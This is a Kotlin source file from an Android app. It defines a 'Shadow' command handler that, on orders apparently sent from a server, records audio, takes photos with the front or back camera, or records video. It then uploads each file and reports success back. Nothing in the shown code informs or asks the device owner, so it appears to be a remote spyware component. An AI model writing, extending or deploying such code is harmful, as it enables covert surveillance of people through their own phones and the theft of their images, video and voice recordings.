package com.hc.calling.commands.shadow

import android.content.Context
import android.hardware.camera2.CameraDevice
import android.os.Handler
import android.view.Surface
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor
import com.hc.calling.commands.shadow.data.ShadowDTO
import com.hc.calling.commands.shadow.data.ShadowVM
import com.hc.calling.commands.shadow.mic.util.RecoderHelper
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.calling.commands.shadow.util.VideoRecoder
import com.hc.calling.util.DateUtil
import com.orhanobut.logger.Logger
import java.io.File

/**
 * Created by ChanHong on 2019/3/27
 *
 * send pic or video to the server
 */

class Shadow(context: Context) : Command(), Executor {
    private val mContext = context

    companion object {
        const val SEND_SHADOW = "send_shadow"
        const val SHADOW = "shadow"

        const val SEND_PIC = "send_pic"
        const val SEND_VIDEO = "send_video"
        const val SEND_VOICE = "send_audio"
    }

    /**
     * @data is the command rule
     * data[0] is  the command type between SEND_PIC     OR     SEND_VIDEO
     * data[1] is the camera type between CAMERA_FRONT = "1"    or    CAMERA_BACK = "0"
     */
    override fun execute(data: Array<Any>) {

        Logger.i(data[0].toString())
        val dto = Gson().fromJson(data[0].toString(), ShadowDTO::class.java)
        val serverCommand = dto.type
        val camera = dto.camera

        if (serverCommand == SEND_VOICE) {
            val path =
                File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp3").path
            RecoderHelper(mContext) {
                ShadowVM().upLoadFile(File(path)) {
                    emitData(SHADOW, "voice upload success")

                }
            }.record(path)

        } else {
            Photographer(
                mContext
            ) { builder, session, device, imageReader, surfaces, handler ->
                when (serverCommand) {
                    SEND_PIC -> {
                        // take photo and post the photo to server
                        Photographer.capture(mContext, builder, session, imageReader, device, handler) {
                            ShadowVM().upLoadFile(File(it)) { data ->
                                Logger.i(data)
                                emitData(SHADOW, "pic upload success")
                            }
                        }
                    }
                    SEND_VIDEO -> {
                        record(device, surfaces, handler)
                    }


                }
            }
                .openCamera(camera)
        }

    }


    /**
     * upload the video when record complete
     */
    fun record(device: CameraDevice, surface: MutableList<Surface>, handler: Handler) {
        val path = File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
        VideoRecoder {
            ShadowVM().upLoadFile(File(it)) { data ->
                Logger.i(data)
                emitData(SHADOW, "video upload success")

            }
        }
            .apply {
                initMediaRecorde(path)
                    .apply {
                        requestRecord(device, surface, handler)
                    }
            }

    }


}